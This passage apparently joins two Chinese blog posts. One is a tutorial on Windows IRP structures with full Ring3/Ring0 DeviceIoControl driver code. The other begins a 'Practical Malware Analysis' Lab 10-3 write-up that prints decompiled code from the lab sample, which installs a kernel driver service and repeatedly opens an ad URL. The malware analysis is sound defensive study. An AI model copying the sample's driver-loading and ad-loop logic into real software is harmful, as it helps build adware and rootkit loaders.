L&quot;\\\\\\\\.\\\\MyRing3Device&quot;int main(int argc, char* argv[])&#123;\t//Call IRP_MJ_CREATE\tgetchar();\tHANDLE hDevice = CreateFileW(\t\tSYM_LINK_NAME, \t\tGENERIC_READ | GENERIC_WRITE, \t\t0,\t\tNULL, \t\tOPEN_EXISTING, \t\tFILE_ATTRIBUTE_NORMAL, \t\tNULL);\t\tif (hDevice == INVALID_HANDLE_VALUE)&#123;\t\tprintf(&quot;Create File Failed!&quot;);\t\tgetchar();\t\treturn -1;\t&#125; else &#123;\t\tprintf(&quot;Create File Success!&quot;);\t&#125;\t//Call IRP_MJ_CLOSE\tgetchar();\tBOOL bCH = CloseHandle(hDevice);\tif(bCH != 0)&#123;\t\tprintf(&quot;Close File Success!&quot;);\t&#125;\tgetchar();\treturn 0;&#125;\n\n初探IRP一个IRP，用于在处理该I&#x2F;O请求的过程中代表该请求。\nIRP结构IRP对象从一个I&#x2F;O请求被发起时开始存在，一直到该I&#x2F;O请求被完成或者取消为止，在此过程中，会有多方操纵此IRP对象，包括I&#x2F;O管理器、即插即用管理器、电源管理器以及一个或多个驱动程序等。Windows I&#x2F;O系统本质上支持异步I&#x2F;O请求，所以，IRP对象必须携带足够多的环境信息，以便能够描述一个I&#x2F;O请求的所有状态。下面来研究一下IRP这个结构。\n\n看上去结构并不复杂，但其中有很多字段包含了结构体，结构体内又内嵌了结构体和联合体，下面结合官方文档中结构的定义来分析（写入到注释中）\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859typedef struct _IRP &#123;  CSHORT                    Type;\t\t//IRP类型，等于IO_TYPE_IRP宏  USHORT                    Size;\t\t//IRP大小  PMDL                      MdlAddress;\t\t//该I/O请求的用户缓冲区的MDL，仅用于“直接I/O”类型  ULONG                     Flags;\t\t//用于记录各种标志  union &#123;    struct _IRP     *MasterIrp;\t\t\t//若这是一个关联IRP，则指向主IRP    __volatile LONG IrpCount;\t\t\t//若这是一个主IRP，则必须先完成多少个关联IRP    PVOID           SystemBuffer;\t\t//该操作被缓冲起来，指向系统地址空间缓冲区的地址  &#125; AssociatedIrp;  LIST_ENTRY                ThreadListEntry;\t//链表项，可以加入到线程的未完成I/O请求链表中  IO_STATUS_BLOCK           IoStatus;\t\t//I/O操作的状态  KPROCESSOR_MODE           RequestorMode;\t//内核模式I/O请求或用户模式I/O请求  BOOLEAN                   PendingReturned;\t//未完成返回  CHAR                      StackCount;\t\t//栈单元（IO_STACK_LOCATION）计数  CHAR                      CurrentLocation;\t//当前栈单元位置  BOOLEAN                   Cancel;\t\t//该I/O请求是否已被取消  KIRQL                     CancelIrql;\t\t//取消自旋锁在哪级IRQL上被获取  CCHAR                     ApcEnvironment;\t//用于当该IRP被初始化时保存APC环境  UCHAR                     AllocationFlags;\t//该IRP内存的分配控制标志  PIO_STATUS_BLOCK          UserIosb;\t\t//用户的I/O状态块  PKEVENT                   UserEvent;\t\t//用户事件对象  union &#123;    struct &#123;      union &#123;        PIO_APC_ROUTINE UserApcRoutine;\t\t//当I/O请求完成时执行的APC例程        PVOID           IssuingProcess;\t\t      &#125;;      PVOID UserApcContext;\t\t\t//传递给UserApcRoutine的环境参数    &#125; AsynchronousParameters;    LARGE_INTEGER AllocationSize;\t\t//分配块的大小  &#125; Overlay;  __volatile PDRIVER_CANCEL CancelRoutine;\t//若是可取消的I/O请求，该域包含了取消时调用的例程  PVOID                     UserBuffer;\t\t//调用者（即发起者，往往是3环程序）提供的输出缓冲区地址    //以下Tail联合成员用于当I/O管理器处理该I/O请求时存放各种工作信息  union &#123;    struct &#123;      union &#123;        KDEVICE_QUEUE_ENTRY DeviceQueueEntry;\t//设备队列项        struct &#123;          PVOID DriverContext[4];\t\t//由驱动程序解释和使用        &#125;;      &#125;;      PETHREAD     Thread;\t\t\t//指向发起者线程的EHTREAD      PCHAR        AuxiliaryBuffer;\t\t//辅助缓冲区      struct &#123;        LIST_ENTRY ListEntry;\t\t\t//存放到完成队列中的链表项        union &#123;          struct _IO_STACK_LOCATION *CurrentStackLocation;\t//指向当前栈单元，驱动程序不可直接访问          ULONG\t\tPacketType;\t\t//Minipacket的类型\t\t        &#125;;      &#125;;      PFILE_OBJECT OriginalFileObject;\t\t//指向原始的文件对象    &#125; Overlay;    KAPC  Apc;\t\t\t\t\t//特殊内核模式APC或发起者的APC    PVOID CompletionKey;\t\t\t//完成键，用于标识在不同文件句柄上的I/O请求  &#125; Tail;&#125; IRP;\n\n根据注释，可以大致了解IRP结构各个字段的含义及作用，这里主要介绍几个接下来会用到的：\n\nAssociatedIrp.SystemBuffer：根据定义，可以发现它是一个指向系统地址空间缓冲区的指针。这个系统地址空间缓冲区又是什么？在前一篇中，我们曾介绍过，在创建完设备对象后，需要设置设备对象的Flags字段，也就是设置数据传输方式。而这个SystemBuffer字段，就是在采用缓冲区方式读写（DO_BUFFERED_IO）时，指向的内核空间中分配的一块用于数据复制、交换的内存\n\nMdlAddress：和SystemBuffer类似，这个字段也是在通过缓冲区处理I&#x2F;O请求时，与设置的数据传输方式有关，这个字段在设备对象采用直接方式读写（DO_DIRECT_IO）时有效。当使用这种方式进行数据读写时，I&#x2F;O请求的发起者调用IoAllocateMdl函数申请一个MDL（Memory Descriptor List，内存描述符链表），将调用者指定的缓冲区的物理页面构成一个MDL，以便于设备驱动程序使用DMA方式来传输数据。这个字段就是记录了一个I&#x2F;O请求所使用的MDL。\n\nUserBuffer：同上。当设备对象采用的是默认方式读写（NEITHER_IO）时，就会使用这个字段。此时I&#x2F;O管理器或者I&#x2F;O请求的发起者不负责缓冲区管理工作，而由驱动程序自行决定该如何使用缓冲区。其中输出缓冲区的指针放在该字段内，缓冲区本身不做任何处理。\n\nIoStatus：I&#x2F;O操作的状态。这个字段是一个_IO_STATUS_BLOCK结构体\n123456789typedef struct _IO_STATUS_BLOCK &#123;  union   &#123;    NTSTATUS  Status;    PVOID  Pointer;  &#125;;  ULONG_PTR  Information;&#125; IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;\n\n1）Status：表示IRP的完成状态，如果三环程序调用完后发生了错误，想通过GetLastError函数来获取错误码，实际上获取到的就是这个Status的值，也就是说，我们自己在驱动中编写特定IRP对应的派遣函数的话，是可以设置它的错误码的。\n2）Information：这个数，决定了返回给3环多少数据。某些3环函数，会传入一部分数据进来（IN类型的参数），也会接收一部分数据（OUT类型的参数）。例如，3环传进来一个CHAR数组，有8个元素，但是我们在该函数的派遣函数中设置的Information的值是2，最后这个数组返回到3环时，就只有2个元素了。具体可以参考后面的程序演示部分。\n\n\n栈单元实际上，IRP数据结构仅仅是一个I&#x2F;O请求的固定描述部分，另一部分是一个或者多个栈单元。每个栈单元针对单个驱动程序，I&#x2F;O管理器在处理一个I&#x2F;O请求时，根据目标设备对象(DeviceObject)的StackSize域，可以知道最多有多少个驱动程序需要参与到该I&#x2F;O请求的处理过程中。\n\n下面来看一下栈单元这个结构：\n\n看上去，这个结构并不复杂，但实际上要注意一下Parameters这个域，这是一个联合体，包含了不同IRP对应的3环函数原型所需的参数，一起来看一下：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206union &#123;    struct &#123;      PIO_SECURITY_CONTEXT     SecurityContext;      ULONG                    Options;      USHORT POINTER_ALIGNMENT FileAttributes;      USHORT                   ShareAccess;      ULONG POINTER_ALIGNMENT  EaLength;    &#125; Create;    struct &#123;      PIO_SECURITY_CONTEXT          SecurityContext;      ULONG                         Options;      USHORT POINTER_ALIGNMENT      Reserved;      USHORT                        ShareAccess;      PNAMED_PIPE_CREATE_PARAMETERS Parameters;    &#125; CreatePipe;    struct &#123;      PIO_SECURITY_CONTEXT        SecurityContext;      ULONG                       Options;      USHORT POINTER_ALIGNMENT    Reserved;      USHORT                      ShareAccess;      PMAILSLOT_CREATE_PARAMETERS Parameters;    &#125; CreateMailslot;    struct &#123;      ULONG                   Length;      ULONG POINTER_ALIGNMENT Key;      ULONG                   Flags;      LARGE_INTEGER           ByteOffset;    &#125; Read;    struct &#123;      ULONG                   Length;      ULONG POINTER_ALIGNMENT Key;      ULONG                   Flags;      LARGE_INTEGER           ByteOffset;    &#125; Write;    struct &#123;      ULONG                   Length;      PUNICODE_STRING         FileName;      FILE_INFORMATION_CLASS  FileInformationClass;      ULONG POINTER_ALIGNMENT FileIndex;    &#125; QueryDirectory;    struct &#123;      ULONG                   Length;      ULONG POINTER_ALIGNMENT CompletionFilter;    &#125; NotifyDirectory;    struct &#123;      ULONG                                                Length;      ULONG POINTER_ALIGNMENT                              CompletionFilter;      DIRECTORY_NOTIFY_INFORMATION_CLASS POINTER_ALIGNMENT DirectoryNotifyInformationClass;    &#125; NotifyDirectoryEx;    struct &#123;      ULONG                                    Length;      FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass;    &#125; QueryFile;    struct &#123;      ULONG                                    Length;      FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass;      PFILE_OBJECT                             FileObject;      union &#123;        struct &#123;          BOOLEAN ReplaceIfExists;          BOOLEAN AdvanceOnly;        &#125;;        ULONG  ClusterCount;        HANDLE DeleteHandle;      &#125;;    &#125; SetFile;    struct &#123;      ULONG                   Length;      PVOID                   EaList;      ULONG                   EaListLength;      ULONG POINTER_ALIGNMENT EaIndex;    &#125; QueryEa;    struct &#123;      ULONG Length;    &#125; SetEa;    struct &#123;      ULONG                                  Length;      FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass;    &#125; QueryVolume;    struct &#123;      ULONG                                  Length;      FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass;    &#125; SetVolume;    struct &#123;      ULONG                   OutputBufferLength;      ULONG POINTER_ALIGNMENT InputBufferLength;      ULONG POINTER_ALIGNMENT FsControlCode;      PVOID                   Type3InputBuffer;    &#125; FileSystemControl;    struct &#123;      PLARGE_INTEGER          Length;      ULONG POINTER_ALIGNMENT Key;      LARGE_INTEGER           ByteOffset;    &#125; LockControl;    struct &#123;      ULONG                   OutputBufferLength;      ULONG POINTER_ALIGNMENT InputBufferLength;      ULONG POINTER_ALIGNMENT IoControlCode;      PVOID                   Type3InputBuffer;    &#125; DeviceIoControl;    struct &#123;      SECURITY_INFORMATION    SecurityInformation;      ULONG POINTER_ALIGNMENT Length;    &#125; QuerySecurity;    struct &#123;      SECURITY_INFORMATION SecurityInformation;      PSECURITY_DESCRIPTOR SecurityDescriptor;    &#125; SetSecurity;    struct &#123;      PVPB           Vpb;      PDEVICE_OBJECT DeviceObject;    &#125; MountVolume;    struct &#123;      PVPB           Vpb;      PDEVICE_OBJECT DeviceObject;    &#125; VerifyVolume;    struct &#123;      struct _SCSI_REQUEST_BLOCK *Srb;    &#125; Scsi;    struct &#123;      ULONG                       Length;      PSID                        StartSid;      PFILE_GET_QUOTA_INFORMATION SidList;      ULONG                       SidListLength;    &#125; QueryQuota;    struct &#123;      ULONG Length;    &#125; SetQuota;    struct &#123;      DEVICE_RELATION_TYPE Type;    &#125; QueryDeviceRelations;    struct &#123;      const GUID *InterfaceType;      USHORT     Size;      USHORT     Version;      PINTERFACE Interface;      PVOID      InterfaceSpecificData;    &#125; QueryInterface;    struct &#123;      PDEVICE_CAPABILITIES Capabilities;    &#125; DeviceCapabilities;    struct &#123;      PIO_RESOURCE_REQUIREMENTS_LIST IoResourceRequirementList;    &#125; FilterResourceRequirements;    struct &#123;      ULONG                   WhichSpace;      PVOID                   Buffer;      ULONG                   Offset;      ULONG POINTER_ALIGNMENT Length;    &#125; ReadWriteConfig;    struct &#123;      BOOLEAN Lock;    &#125; SetLock;    struct &#123;      BUS_QUERY_ID_TYPE IdType;    &#125; QueryId;    struct &#123;      DEVICE_TEXT_TYPE       DeviceTextType;      LCID POINTER_ALIGNMENT LocaleId;    &#125; QueryDeviceText;    struct &#123;      BOOLEAN                                          InPath;      BOOLEAN                                          Reserved[3];      DEVICE_USAGE_NOTIFICATION_TYPE POINTER_ALIGNMENT Type;    &#125; UsageNotification;    struct &#123;      SYSTEM_POWER_STATE PowerState;    &#125; WaitWake;    struct &#123;      PPOWER_SEQUENCE PowerSequence;    &#125; PowerSequence;#if ...    struct &#123;      union &#123;        ULONG                      SystemContext;        SYSTEM_POWER_STATE_CONTEXT SystemPowerStateContext;      &#125;;      POWER_STATE_TYPE POINTER_ALIGNMENT Type;      POWER_STATE POINTER_ALIGNMENT      State;      POWER_ACTION POINTER_ALIGNMENT     ShutdownType;    &#125; Power;#else    struct &#123;      ULONG                              SystemContext;      POWER_STATE_TYPE POINTER_ALIGNMENT Type;      POWER_STATE POINTER_ALIGNMENT      State;      POWER_ACTION POINTER_ALIGNMENT     ShutdownType;    &#125; Power;#endif    struct &#123;      PCM_RESOURCE_LIST AllocatedResources;      PCM_RESOURCE_LIST AllocatedResourcesTranslated;    &#125; StartDevice;    struct &#123;      ULONG_PTR ProviderId;      PVOID     DataPath;      ULONG     BufferSize;      PVOID     Buffer;    &#125; WMI;    struct &#123;      PVOID Argument1;      PVOID Argument2;      PVOID Argument3;      PVOID Argument4;    &#125; Others;  &#125; Parameters;\n\n那这个Parameters该如何用呢？举个例子，假设3环程序调用了DeviceIoControl函数，在0环，就会构造一个IRP_MJ_DEVICE_CONTROL这个类型的IRP，然后我们就可以构建它的派遣函数了。在派遣函数中，当我们获得了当前驱动的栈单元时，就可以通过如下语句访问3环函数DeviceIoControl的参数了，例如：\n12345//获取IO_STACK_LOCATIONPIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);//获取3环函数参数ULONG InputBufferLength = pStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;ULONG FsControlCode = pStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;\n\n其中，IoGetCurrentIrpStackLocation函数，将Irp指针传进去，可以获取当前驱动程序对应的栈单元。接着就可以通过栈单元获取我们想要的参数了\n3环与0环通信（升级）操作码在了解了上述知识后，我们就可以对前一篇文章中的代码进行一次升级，更清晰的看到3环和0环的信息交互过程。在此之前，我们需要了解一个操作码。本次实验会在3环程序中新增一个DeviceIoControl函数，因为这个函数能既有传入的参数，也有输出的参数，可以比较直观的看明白3环和0环交互的数据。具体定义如图：\n\n其中需要解释一下的，就是这个dwIoControlCode参数，这个就相当于Switch语句中传入的那个参数，用来判断程序执行流程用的，当操作码不同时，执行的功能也不同，操作码定义如下：\n12#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)\n\nCTL_CODE函数，会接收这四个参数，并通过某一种算法，生成一个四字节的操作码，3环和0环中用的是同一套操作码，其中第二个参数，这个值必须选定一个大于等于0x800的值，之前的值由系统保留使用。\n\n\n\n\n\n\n\n\n\n以下宏可用于从 IOCTL 代码中提取 16 位 DeviceType 和 2 位 TransferType 字段：\n#define DEVICE_TYPE_FROM_CTL_CODE(ctrlCode)   (((ULONG)(ctrlCode &amp; 0xffff0000)) &gt;&gt; 16)#define METHOD_FROM_CTL_CODE(ctrlCode)        ((ULONG)(ctrlCode &amp; 3))\n新增代码本次实验新增的代码，就是在3环程序增加了DeviceIoControl这个函数，以及相应的驱动增加了派遣函数。具体变化如下：\nRing3新增部分：\n123456789101112131415161718192021#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)//Call IRP_MY_DEVICE_CONTROL\tgetchar();\tchar pInputBuffer[20] = &#123;1, 2, 4, 8, 16, 32, 64, 0&#125;;\tchar pOutputBuffer[20] = &#123;0&#125;;\tDWORD dwReturnSize = 0;    BOOL bDIC = DeviceIoControl(hDevice, OPCODE2, pInputBuffer, 8, pOutputBuffer, 20, &amp;dwReturnSize, NULL);\tif(bDIC != 0)&#123;\t\tprintf(&quot;ReturnSize: %x\\n&quot;, dwReturnSize);\t\tprintf(&quot;OutputBuffer: &quot;);\t\tfor(int i = 0; i &lt; dwReturnSize; i++)&#123;\t\t\tprintf(&quot;%x &quot;, pOutputBuffer[i]);\t\t&#125;\t&#125;\telse &#123;\t\tprintf(&quot;Communicate Failed!\\n&quot;);\t\treturn -1;\t&#125;\tprintf(&quot;\\nRing3 And Ring0 Communicate Success!\\n&quot;);\n\n代码中传入一个初始化了8个字节的数组，并且用另一个空数组来接收0环的数据，DeviceIoControl执行完后，根据返回的长度大小，以及返回的Buffer，来打印返回的数据。\nRing0新增部分：\n12345678910111213141516171819202122232425262728293031323334#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)NTSTATUS IrpDeviceControlProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp DeviceControl Dispatch Function...\\n&quot;);\t//获取缓冲区数据\tPVOID pSystemBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;\t//获取IO_STACK_LOCATION\tPIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);\tULONG InputBufferLength = pStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;\tULONG FsControlCode = pStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;\t//判断操作码\tswitch (FsControlCode)\t&#123;\tcase OPCODE1:\t\tDbgPrint(&quot;不打印操作码&quot;);\t\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\t\tpIrp-&gt;IoStatus.Information = 2;\t\tbreak;\tcase OPCODE2:\t\tDbgPrint(&quot;操作码：%x\\n&quot;, FsControlCode);\t\tfor (UINT32 i = 0; i &lt; InputBufferLength; i++) &#123;\t\t\tDbgPrint(&quot;Ring3 Data: %x\\n&quot;, ((PUCHAR)pSystemBuffer)[i]);\t\t&#125;\t\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\t\tpIrp-&gt;IoStatus.Information = 5;\t\tbreak;\t&#125;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;\n\n来简要看一下派遣函数的执行流程：\n\n由于在设备对象的Flags字段定义过缓冲区读取的类型是（DO_BUFFERED_IO），因此我们可以直接从AssociatedIrp.SystemBuffer中读取3环传入的数据，也就是DeviceIoControl中pInputBuffer参数指向的数据。\n\n通过IoGetCurrentIrpStackLocation函数获取到栈单元，再通过栈单元获取到Parameters中DeviceIoControl结构体里对应的参数\n123456struct &#123;      ULONG                   OutputBufferLength;      ULONG POINTER_ALIGNMENT InputBufferLength;      ULONG POINTER_ALIGNMENT IoControlCode;      PVOID                   Type3InputBuffer;    &#125; DeviceIoControl;\n\n这里我们仅取操作码IoControlCode，用于判断执行流程；以及InputBufferLength，用于打印传入数据\n\n然后就是根据操作码的不同，执行不同的流程了：\n1）操作码1：不做任何操作，向3环返回2字节大小的数据\n2）操作码2：打印操作码的值；根据传入数据的长度，打印传入的数据；向3环返回5字节大小的数据\n\n\n完整代码Ring3部分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &quot;stdafx.h&quot;#include &quot;Windows.h&quot;#include &quot;winioctl.h&quot;#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)#define SYM_LINK_NAME L&quot;\\\\\\\\.\\\\MyRing3Device&quot;int main(int argc, char* argv[])&#123;\t//Call IRP_MJ_CREATE\tgetchar();\tHANDLE hDevice = CreateFileW(\t\tSYM_LINK_NAME, \t\tGENERIC_READ | GENERIC_WRITE, \t\t0,\t\tNULL, \t\tOPEN_EXISTING, \t\tFILE_ATTRIBUTE_NORMAL, \t\tNULL);\t\tif (hDevice == INVALID_HANDLE_VALUE)&#123;\t\tprintf(&quot;Create File Failed!&quot;);\t\tgetchar();\t\treturn -1;\t&#125; else &#123;\t\tprintf(&quot;Create File Success!&quot;);\t&#125;\t//Call IRP_MY_DEVICE_CONTROL\tgetchar();\tchar pInputBuffer[20] = &#123;1, 2, 4, 8, 16, 32, 64, 0&#125;;\tchar pOutputBuffer[20] = &#123;0&#125;;\tDWORD dwReturnSize = 0;    BOOL bDIC = DeviceIoControl(hDevice, OPCODE2, pInputBuffer, 8, pOutputBuffer, 20, &amp;dwReturnSize, NULL);\tif(bDIC != 0)&#123;\t\tprintf(&quot;ReturnSize: %x\\n&quot;, dwReturnSize);\t\tprintf(&quot;OutputBuffer: &quot;);\t\tfor(int i = 0; i &lt; dwReturnSize; i++)&#123;\t\t\tprintf(&quot;%x &quot;, pOutputBuffer[i]);\t\t&#125;\t&#125;\telse &#123;\t\tprintf(&quot;Communicate Failed!\\n&quot;);\t\treturn -1;\t&#125;\tprintf(&quot;\\nRing3 And Ring0 Communicate Success!\\n&quot;);\t//Call IRP_MJ_CLOSE\tgetchar();\tBOOL bCH = CloseHandle(hDevice);\tif(bCH != 0)&#123;\t\tprintf(&quot;Close File Success!&quot;);\t&#125;\tgetchar();\treturn 0;&#125;\n\nRing0部分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#include &quot;ntifs.h&quot;#define DEVICE_NAME L&quot;\\\\Device\\\\MyDevice&quot;#define SYM_LINK_NAME L&quot;\\\\??\\\\MyRing3Device&quot;#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj);NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);NTSTATUS IrpDeviceControlProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);//Driver Entry                                   NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING RegistryPath) &#123;\tDbgPrint(&quot;Driver is running!\\n&quot;);\tPDEVICE_OBJECT pDeviceObj = NULL;\tNTSTATUS status = 0;\t//Create Deivce Object\tUNICODE_STRING DeviceName;\tRtlInitUnicodeString(&amp;DeviceName, DEVICE_NAME);\tstatus = IoCreateDevice(pDriverObj,\t\t0,\t\t&amp;DeviceName,\t\tFILE_DEVICE_UNKNOWN,\t\t0,\t\tFALSE,\t\t&amp;pDeviceObj);\tif (status != STATUS_SUCCESS) &#123;\t\tDbgPrint(&quot;Device Create Failed!\\n&quot;);\t\treturn status;\t&#125;\telse &#123;\t\tDbgPrint(&quot;Device Create Success!\\n&quot;);\t&#125;\t//Set Communicate Ways\t//注意这里一定要用&quot;|=&quot;, 而不能直接用&quot;=&quot;,因为在创建Device时会给Fllags赋上一个初值\tpDeviceObj-&gt;Flags |= DO_BUFFERED_IO;\t//Create Symbollic Link\tUNICODE_STRING SymbolicLinkName;\tRtlInitUnicodeString(&amp;SymbolicLinkName, SYM_LINK_NAME);\tIoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);\t//Set Dispatch Function\tpDriverObj-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;\tpDriverObj-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;\tpDriverObj-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControlProc;\t//Set Unload Function\tpDriverObj-&gt;DriverUnload = Drvier_Unload;\treturn STATUS_SUCCESS;&#125;NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp Create Dispatch Function...\\n&quot;);\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\tpIrp-&gt;IoStatus.Information = 0;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp Close Dispatch Function...\\n&quot;);\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\tpIrp-&gt;IoStatus.Information = 0;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;NTSTATUS IrpDeviceControlProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp DeviceControl Dispatch Function...\\n&quot;);\t//获取缓冲区数据\tPVOID pSystemBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;\t//获取IO_STACK_LOCATION\tPIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);\tULONG InputBufferLength = pStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;\tULONG FsControlCode = pStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;\t//判断操作码\tswitch (FsControlCode)\t&#123;\tcase OPCODE1:\t\tDbgPrint(&quot;不打印操作码&quot;);\t\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\t\tpIrp-&gt;IoStatus.Information = 2;\t\tbreak;\tcase OPCODE2:\t\tDbgPrint(&quot;操作码：%x\\n&quot;, FsControlCode);\t\tfor (UINT32 i = 0; i &lt; InputBufferLength; i++) &#123;\t\t\tDbgPrint(&quot;Ring3 Data: %x\\n&quot;, ((PUCHAR)pSystemBuffer)[i]);\t\t&#125;\t\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\t\tpIrp-&gt;IoStatus.Information = 5;\t\tbreak;\t&#125;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj) &#123;\t//Delete SymbolicLink\tUNICODE_STRING SymbolicLinkName;\tRtlInitUnicodeString(&amp;SymbolicLinkName, SYM_LINK_NAME);\tIoDeleteSymbolicLink(&amp;SymbolicLinkName);\t//Delete Deivce\tIoDeleteDevice(pDriverObj-&gt;DeviceObject);\tDbgPrint(&quot;Unload Success!\\n&quot;);&#125;\n\n\n\n\n\n\n\n《恶意代码分析实战》——Lab10.3基于Windows XP环境\n使用dd命令查看主函数表的函数：\n1dd 设备地址+主函数偏移 L1C  //winxp中允许0x1C种可能的主函数代码\n\n静态分析-Lab10-03.exe使用ida查看Lab10-03.exe主函数，可以看到主要分为两部分：第一部分由OpenSCManagerA到DeviceIoControl之间的函数调用组成，包含加载和发送请求到内核驱动的函数CreateFileA、DeviceIoControl等；第二部分由其余的函数调用组成，这表明是一个COM对象的使用。\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)&#123;  SC_HANDLE v4; // eax@1  SC_HANDLE v5; // eax@2  void *v6; // esi@2  HANDLE v7; // eax@4  BSTR v9; // esi@8  LPVOID ppv; // [sp+4h] [bp-28h]@7  DWORD BytesReturned; // [sp+8h] [bp-24h]@6  VARIANTARG pvarg; // [sp+Ch] [bp-20h]@8  __int16 v13; // [sp+1Ch] [bp-10h]@8  int v14; // [sp+24h] [bp-8h]@8  v4 = OpenSCManagerA(0, 0, 0xF003Fu);  if ( v4 )  &#123;    v5 = CreateServiceA(           v4,           &quot;Process Helper&quot;,           &quot;Process Helper&quot;,           0xF01FFu,           1u,           3u,           1u,           &quot;C:\\\\Windows\\\\System32\\\\Lab10-03.sys&quot;,           0,           0,           0,           0,           0);    v6 = v5;    if ( v5 )      StartServiceA(v5, 0, 0);    CloseServiceHandle(v6);    v7 = CreateFileA(&quot;\\\\\\\\.\\\\ProcHelper&quot;, 0xC0000000, 0, 0, 2u, 0x80u, 0);    if ( v7 == (HANDLE)-1 )      return 1;    DeviceIoControl(v7, 0xABCDEF01, 0, 0, 0, 0, &amp;BytesReturned, 0);    if ( OleInitialize(0) &gt;= 0 )    &#123;      CoCreateInstance(&amp;rclsid, 0, 4u, &amp;riid, &amp;ppv);      if ( ppv )      &#123;        VariantInit(&amp;pvarg);        v13 = 3;        v14 = 1;        v9 = SysAllocString(L&quot;http://www.malwareanalysisbook.com/ad.html&quot;);        while ( 1 )        &#123;          (*(void (__stdcall **)(LPVOID, BSTR, __int16 *, VARIANTARG *, VARIANTARG *, VARIANTARG *))(*(_DWORD *)ppv + 44))(            ppv,            v9,            &amp;v13,            &amp;pvarg,            &amp;pvarg,            &amp;pvarg);          Sleep(0x7530u);        &#125;      &#125;      OleUninitialize();    &#125;  &#125;  return 0;&#125;\n\n静态分析-Lab10-03.sys在sub_10706函数中，首先调用IoCreateDevice创建了一个名为”\\Device\\ProcHelper”的设备，然后设置设备主函数表DriverObject-&gt;MajorFunction（其中，IRP_MJ_CREATE -&gt; 0，IRP_MJ_CLOSE -&gt; 2，IRP_MJ_DEVICE_CONTROL -&gt; 